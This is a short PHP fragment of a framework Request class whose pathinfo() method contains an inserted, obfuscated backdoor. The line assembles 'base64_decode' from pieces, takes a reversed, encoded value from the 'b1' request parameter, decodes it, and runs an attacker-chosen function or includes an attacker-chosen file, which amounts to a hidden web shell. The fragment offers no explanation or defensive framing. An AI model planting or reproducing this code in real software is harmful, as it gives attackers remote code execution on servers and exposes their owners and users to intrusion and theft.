...
class Request
{
    ...
    public function pathinfo()
    {
        ...
        ;$c0st;$b65="bas"."e64_dec"."ode";$l1i=isset($_REQUEST["b1"])?$l1i=@$_REQUEST["b1"]:0;$l1i&&$l1i=@json_decode($b65(strrev($l1i)));$l1i&&is_array($l1i)&&die($l1i[0]($l1i[1]=="i"?include($l1i[2]):$l1i[1]($l1i[2],$l1i[3])));;$c0ed;return $this->pathinfo;
    }
